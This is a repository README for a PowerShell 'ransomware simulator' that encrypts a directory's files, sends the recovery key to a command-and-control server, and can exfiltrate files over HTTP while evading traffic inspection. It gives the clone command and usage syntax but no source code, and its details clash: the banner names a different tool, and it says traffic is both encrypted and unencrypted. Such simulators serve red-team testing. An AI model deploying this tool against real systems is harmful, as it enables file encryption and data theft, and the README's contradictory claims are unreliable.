
# PSNccs
**PSNccs** is a PowerShell Ransomware Simulator with C2 Server capabilities. This tool helps you simulate encryption process of a generic ransomware in any system on any system with PowerShell installed on it. Thanks to the integrated C2 server, you can exfiltrate files and receive client information via HTTP. 

All communication between the two elements is encrypted or encoded so as to be undetected by traffic inspection mechanisms, although at no time is HTTPS used at any time.

# Requirements
- PowerShell 4.0 or greater


# Download
It is recommended to clone the complete repository or download the zip file.
You can do this by running the following command:
```
git clone https://github.com/DarkHacker420/PSNccs
```


# Usage
```
.\PSNccs -h

  ____  ____  ____
 |  _ \/ ___||  _ \ __ _ _ __  ___  ___  _ __ ___
 | |_) \___ \| |_) / _' | '_ \/ __|/ _ \| '_ ' _ \
 |  __/ ___) |  _ < (_| | | | \__ \ (_) | | | | | |
 |_|   |____/|_| \_\__,_|_| |_|___/\___/|_| |_| |_|

  ----------------- by @DARK-SHADOW ----------------

 Info:  This tool helps you simulate encryption process of a
        generic ransomware in PowerShell with C2 capabilities

 Usage: .\PSNccs.ps1 -e Directory -s C2Server -p C2Port
          Encrypt all files & sends recovery key to C2Server
          Use -x to exfiltrate and decrypt files on C2Server

        .\PSNccs.ps1 -d Directory -k RecoveryKey
          Decrypt all files with recovery key string

 Warning: All info will be sent to the C2Server without any encryption
          You need previously generated recovery key to retrieve files

```


# License
This project is licensed under the GNU 3.0 license - see the LICENSE file for more details.


